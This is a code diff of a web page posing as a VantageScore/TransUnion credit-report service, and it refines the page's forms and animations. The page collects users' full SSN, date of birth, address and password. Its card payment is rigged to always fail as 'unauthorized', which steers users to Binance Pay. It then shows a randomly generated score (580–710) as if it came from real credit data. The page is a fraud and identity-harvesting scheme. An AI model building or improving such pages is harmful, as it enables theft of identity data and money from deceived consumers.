       <div class="vantage-line" id="vantageLine">VantageScore® 3.0 based on TransUnion data as of <span id="scoreDate">—</span></div>
 
-      <!-- Rating labels placed under the gauge -->
       <div class="rating-labels">
         <span id="labelBad">Bad</span>
         <span id="labelFair">Fair</span>
@@ -550,30 +463,25 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     </div>
 
     <!-- Personal info block under the meter -->
-    <div class="personal-block">
+    <div class="personal-block" style="margin-top:14px;">
       <div class="info-grid">
         <div class="info-col">
           <div class="info-label">Personal Info</div>
           <div class="info-val" id="piName">—</div>
         </div>
-
         <div class="info-col">
           <div class="info-label">DOB</div>
           <div class="info-val" id="piDOB">—</div>
         </div>
-
         <div class="info-col">
           <div class="info-label">SSN</div>
           <div class="info-val">XXX-XX-XXXX</div>
         </div>
-
         <div class="info-col">
           <div class="info-label">Employment Info</div>
           <div class="info-val" id="piEmployment" style="color:var(--muted);font-style:italic">No employment info reported</div>
         </div>
-
         <div style="flex-basis:100%"></div>
-
         <div class="info-col" style="flex:1 1 100%">
           <div class="info-label">Address</div>
           <div class="info-val" id="piAddress">—</div>
@@ -595,7 +503,7 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
   function gotoPage(id){
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
-    window.scrollTo(0,0);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
   }
 
   // Keep user data across steps
@@ -614,6 +522,15 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     password: ''
   };
 
+  // Set max for DOB (no future)
+  document.addEventListener('DOMContentLoaded', function(){
+    const dob = document.getElementById('dob');
+    if (dob) {
+      const today = new Date().toISOString().split('T')[0];
+      dob.setAttribute('max', today);
+    }
+  });
+
   // PAGE 2 submit
   document.getElementById('form-personal').addEventListener('submit', function(e){
     e.preventDefault();
@@ -625,7 +542,6 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     user.city      = document.getElementById('city').value.trim();
     user.zip       = document.getElementById('zip').value.trim();
 
-    // basic validation
     if (!user.firstName || !user.lastName || !user.email) {
       alert('Please fill required fields.');
       return;
@@ -643,12 +559,10 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     const pw = document.getElementById('password').value;
     const cpw = document.getElementById('confirmPassword').value;
 
-    // validations
     if (!user.ssn1 || !user.ssn2 || !user.ssn3) { alert('Please enter complete SSN.'); return; }
     if (!user.dob) { alert('Please provide your date of birth.'); return; }
     if (!pw || pw !== cpw) { alert('Passwords do not match or are empty.'); return; }
     user.password = pw;
-
     gotoPage('page4');
   });
 
@@ -659,7 +573,6 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     return { x: cx + radius * Math.cos(angleRad), y: cy + radius * Math.sin(angleRad) };
   }
   function describeArc(cx, cy, radius, startAngle, endAngle){
-    // ensure largeArc uses absolute angular span
     const start = polarToCartesian(cx, cy, radius, endAngle);
     const end = polarToCartesian(cx, cy, radius, startAngle);
     const delta = Math.abs(endAngle - startAngle);
@@ -672,7 +585,7 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     return -120 + pct * 240; // -120..120
   }
 
-  // Draw segments based on boundaries
+  // Draw gauge visuals
   function drawGauge(){
     const cx=400, cy=260, r=150;
     const angles = [
@@ -692,7 +605,6 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     document.getElementById('arcGreen').setAttribute('stroke', 'url(#gGreen)');
     document.getElementById('gloss').setAttribute('d', describeArc(cx,cy,r-12, angles[0], angles[4]));
 
-    // ticks
     const ticks = document.getElementById('ticks');
     const ticksShadow = document.getElementById('ticks-shadow');
     ticks.innerHTML = '';
@@ -707,7 +619,6 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
       ln.setAttribute('stroke','#102240'); ln.setAttribute('stroke-width', (s%100===0)?3: (s%50===0?1.6:0.9)); ln.setAttribute('stroke-linecap','round');
       ticks.appendChild(ln);
 
-      // shadow tick
       const lnS = ln.cloneNode();
       lnS.setAttribute('stroke','#000');
       lnS.setAttribute('stroke-opacity','0.06');
@@ -729,17 +640,15 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     }
   }
 
-  // animate needle (slower, luxurious easing)
+  // animate needle (luxury easing)
   function animateNeedle(fromA, toA, durationMs){
     const g = document.getElementById('needleGroup');
     const start = performance.now();
     function step(now){
       const t = Math.min(1, (now - start) / durationMs);
-      // smoother ease out cubic then back-slight overshoot settle
       const eased = t < 0.8 ? (1 - Math.pow(1 - (t/0.8), 3)) * 0.98 : 0.98 + (t-0.8)/0.2 * 0.02;
       const cur = fromA + (toA - fromA) * eased;
       g.setAttribute('transform', `rotate(${cur} 400 260)`);
-      // small subtle wobble near the end for realism
       if (t < 1) requestAnimationFrame(step);
     }
     requestAnimationFrame(step);
@@ -754,30 +663,38 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     document.getElementById('cardPayment').style.display = 'none';
     document.getElementById('binancePayment').style.display = 'none';
     document.getElementById('cardError').style.display = 'none';
+    document.getElementById('pmCard').setAttribute('aria-selected','false');
+    document.getElementById('pmBinance').setAttribute('aria-selected','false');
     if (type === 'card'){
       document.getElementById('pmCard').classList.add('active');
       document.getElementById('cardPayment').style.display = 'block';
+      document.getElementById('pmCard').setAttribute('aria-selected','true');
     } else {
       document.getElementById('pmBinance').classList.add('active');
       document.getElementById('binancePayment').style.display = 'block';
+      document.getElementById('pmBinance').setAttribute('aria-selected','true');
     }
   }
 
-  // card brand detection (simple)
+  // card brand detection and formatting
   const cardNumberInput = document.getElementById('cardNumber');
   const brandIcon = document.getElementById('cardBrandIcon');
   cardNumberInput.addEventListener('input', function(e){
-    const v = this.value.replace(/\s+/g,'');
-    // format with spaces
-    this.value = v.replace(/(.{4})/g, '$1 ').trim();
+    let v = this.value.replace(/\D/g,'').slice(0,19);
+    // format with spaces every 4
+    const groups = v.match(/.{1,4}/g);
+    this.value = groups ? groups.join(' ') : v;
     if (v.startsWith('4')){
       brandIcon.className = 'fab fa-cc-visa';
       brandIcon.style.color = '#0b4fd6';
     } else if (v.startsWith('5') || v.startsWith('2')){
       brandIcon.className = 'fab fa-cc-mastercard';
       brandIcon.style.color = '#d94f1a';
+    } else if (v.startsWith('34') || v.startsWith('37')){
+      brandIcon.className = 'fab fa-cc-amex';
+      brandIcon.style.color = '#1b6f9b';
     } else {
-      brandIcon.className = 'fab fa-credit-card';
+      brandIcon.className = 'fas fa-credit-card';
       brandIcon.style.color = '#666';
     }
   });
@@ -789,73 +706,51 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     o.style.display = 'flex';
     o.setAttribute('aria-hidden', 'false');
   }
-  function hideOverlay(){ 
+  function hideOverlay(){
     const o = document.getElementById('overlay');
-    o.style.display = 'none'; 
+    o.style.display = 'none';
     o.setAttribute('aria-hidden', 'true');
   }
 
-  // Card confirm: show processing then unauthorized error (now 7 seconds)
+  // Card confirm: show processing then unauthorized error (7s)
   document.getElementById('confirmCardBtn').addEventListener('click', function(){
-    const tid = document.getElementById('cardNumber').value.trim();
+    const cardNum = document.getElementById('cardNumber').value.replace(/\s/g,'').trim();
     const accepted = document.getElementById('acceptTermsCard').checked;
     if (!accepted) { alert('Please accept the terms to proceed.'); return; }
-    if (!tid) { alert('Enter your card number before continuing.'); return; }
-
-    // show processing overlay for 7 seconds
+    if (!cardNum || cardNum.length < 12) { alert('Enter a valid card number before continuing.'); return; }
     showOverlay('Processing card payment...');
-    // hide any previous error
     document.getElementById('cardError').style.display = 'none';
-
     setTimeout(()=>{
       hideOverlay();
-      // show unauthorized error message and stay on page4
       document.getElementById('cardErrorText').textContent = 'Payment unauthorized — try a different card or choose a different payment method.';
       document.getElementById('cardError').style.display = 'flex';
     }, 7000);
   });
 
-  // Binance confirm: uses existing flow but when selected should approve and move to page5
+  // Binance confirm: validate, simulate success and show page5
   document.getElementById('confirmBinanceBtn').addEventListener('click', function(){
     const tid = document.getElementById('tid').value.trim();
     const accepted = document.getElementById('acceptTerms').checked;
     if (!accepted) { alert('Please accept the terms to proceed.'); return; }
     if (!tid) { alert('Enter your Transaction ID (TID) before continuing.'); return; }
-
     showOverlay('Processing Binance Pay...');
-    // 7 second processing for dramatic luxury effect
-    setTimeout(()=>{ 
-      // on success
+    setTimeout(()=>{
       hideOverlay();
-
       // set personal display
       const fullName = `${user.firstName || ''} ${user.lastName || ''}`.trim();
       document.getElementById('piName').textContent = fullName || '—';
       document.getElementById('piDOB').textContent = user.dob || '—';
       document.getElementById('piAddress').textContent = `${user.address || ''}${user.city ? ', ' + user.city : ''}${user.zip ? ' ' + user.zip : ''}` || '—';
-
-      // draw gauge visuals
       drawGauge();
-
-      // generate random score (changed to 580-710 as requested)
       const score = randInt(580,710);
       const angle = scoreToAngle(score);
-
-      // reset needle to leftmost then animate slow luxury sweep
       const needle = document.getElementById('needleGroup');
       needle.setAttribute('transform','rotate(-120 400 260)');
       gotoPage('page5');
-
-      // set small numeric and date
-      const scoreSmall = document.getElementById('scoreSmall');
-      scoreSmall.textContent = score;
+      document.getElementById('scoreSmall').textContent = score;
       const dateStr = (new Date()).toLocaleDateString('en-US', { year:'numeric', month:'long', day:'numeric' });
       document.getElementById('scoreDate').textContent = dateStr;
-
-      // animate needle with slowed duration for luxury feel (3000ms)
       setTimeout(()=> animateNeedle(-120, angle, 3000), 120);
-
-      // subtle afterglow on the chosen arc - quick flash
       (function arcFlash(){
         const arcs = ['arcRed','arcOrange','arcYellow','arcGreen'];
         arcs.forEach(a => {
@@ -870,34 +765,22 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
           });
         }, 1400);
       })();
-
-      // update the rating label emphasis (visual hint) based on score
       setTimeout(()=> updateRatingLabels(score), 300);
-
     }, 7000);
   });
 
-  // Update rating labels style based on score (visual hint)
+  // Update rating labels
   function updateRatingLabels(score){
-    // reset
     ['labelBad','labelFair','labelGood','labelExcellent'].forEach(id=>{
       const el = document.getElementById(id);
       el.style.opacity = '0.65';
       el.style.color = 'var(--muted)';
       el.style.textDecoration = 'none';
     });
-    // determine which label to emphasize roughly by numeric bands:
-    // Bad: <= 559, Fair: 560-659, Good: 660-739, Excellent: >=740
-    // (Our random score is within 580-710, so mostly Fair/Good)
-    if (score <= 559){
-      highlightLabel('labelBad');
-    } else if (score <= 659){
-      highlightLabel('labelFair');
-    } else if (score <= 739){
-      highlightLabel('labelGood');
-    } else {
-      highlightLabel('labelExcellent');
-    }
+    if (score <= 559) { highlightLabel('labelBad'); }
+    else if (score <= 659) { highlightLabel('labelFair'); }
+    else if (score <= 739) { highlightLabel('labelGood'); }
+    else { highlightLabel('labelExcellent'); }
   }
   function highlightLabel(id){
     const el = document.getElementById(id);
@@ -906,22 +789,26 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     el.style.textDecoration = 'underline';
   }
 
-  // draw once on load so arcs are visible if user jumps
+  // draw once on load
   document.addEventListener('DOMContentLoaded', function(){
     drawGauge();
-    // ensure default payment selection
     selectPayment('card');
-
-    // initial styling micro-animations
     const svg = document.getElementById('gaugeSVG');
     svg.style.transition = 'transform 1200ms cubic-bezier(.2,.9,.2,1)';
     svg.style.transformOrigin = '50% 50%';
     setTimeout(()=> svg.style.transform = 'scale(1.01)', 600);
     setTimeout(()=> svg.style.transform = 'scale(1)', 1600);
-    
- script>
+  });
 
+  // small UX: automatically move SSN focus
+  ['ssn1','ssn2','ssn3'].forEach((id, idx, arr)=>{
+    const el = document.getElementById(id);
+    el && el.addEventListener('input', function(){
+      if (this.value.length >= this.maxLength && idx < arr.length - 1) {
+        document.getElementById(arr[idx+1]).focus();
+      }
+    });
+  });
+</script>
 </body>
-
-</html> 
-
+</html>
